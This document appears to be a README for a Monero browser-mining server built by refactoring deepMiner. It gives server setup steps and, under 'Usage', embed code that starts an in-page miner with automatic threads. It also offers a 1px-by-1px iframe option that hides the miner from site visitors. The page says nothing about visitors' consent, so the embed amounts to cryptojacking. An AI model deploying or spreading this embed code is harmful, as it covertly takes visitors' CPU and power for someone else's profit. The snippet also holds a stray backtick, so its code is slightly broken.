# Oniric Layer

[![Build Status](https://travis-ci.org/joemccann/dillinger.svg?branch=master)](https://travis-ci.org/joemccann/dillinger)

A private XMR Server worker that work for one wallet 
complete typescript refactoring and optimization 
of https://github.com/deepwn/deepMiner


## Installation (On server)

* First Usage
```sh
  npm i
```
* Development Mode
```sh
 npm run compile
 npm run dev
```

* Production Mode
```sh
 npm run compile
 npm run prod
```

* Considerations

to run executable generated by pkg you must modify ecosystem.config.js file
and replace script parameter with ./dist/build/Oniric with given extension

* Server Deploy

1. copy dist/build/*.js or dist/build/Oniric.*  and ecosystem.config.js in a new directory
2. modify ecosystem.config.js script parameter and name parameter
3. run these commands
```sh
 npm install -g pm2
 pm2 start ecosystem.config.js
```


## Usage (Add to webpage)

* Classic Config

```
<script src="server/lib/oniric.min.js"> </script>
<script> var userID = 'Oniric';
         var miner = new Oniric.Init(userID, {
         	autoThreads: true`
         });
         miner.start(); 
 </script>
```

* IFrame Based

```
<iframe style="display:block" width="1px" height="1px" src="yourserver:port/miner.html"></iframe>
```


## Contributing

1. Fork it!
2. Create your feature branch: `git checkout -b my-new-feature`
3. Commit your changes: `git commit -am 'Add some feature'`
4. Push to the branch: `git push origin my-new-feature`
5. Submit a pull request :D


## Credits

https://github.com/webdiamond
https://github.com/deepwn

